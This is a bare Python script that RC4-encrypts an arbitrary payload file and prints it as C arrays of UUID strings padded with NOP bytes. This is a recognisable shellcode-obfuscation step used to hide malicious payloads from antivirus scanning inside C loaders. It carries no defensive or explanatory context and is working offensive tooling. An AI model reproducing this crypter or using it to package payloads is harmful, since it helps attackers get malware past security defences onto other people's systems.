from Crypto.Cipher import ARC4
from Crypto.Random import get_random_bytes
from uuid import UUID
import sys

def format_as_c_array(name, byte_array):
    lines = []
    for i in range(0, len(byte_array), 16):
        segment = byte_array[i:i+16]
        c_line = ''.join(f"\\x{b:02x}" for b in segment)
        lines.append(f"\"{c_line}\"")
    return f"unsigned char {name}[] = \n" + "\n".join(lines) + ";"

payload = open(sys.argv[1], "rb")
content = payload.read()
payload.close()

key = get_random_bytes(16)
cipher = ARC4.new(key)
payload_rc4 = cipher.encrypt(content)

print(f"#define PAYLOAD_SIZE {len(content)}\n")
print(format_as_c_array("key", key))
print("BYTE uuids[][37] =")  
print("{")  
chunk = payload_rc4

while len(chunk) >= 16:
    print("\t\"{}\",".format(UUID(bytes_le=chunk[:16])))  
    chunk = chunk[16:]  

if len(chunk) > 0:
    padding = 16 - len(chunk)
    chunk = chunk + (b"\x90" * padding) 
    print("\t\"{}\"".format(UUID(bytes_le=chunk[:16])))  

print("};")
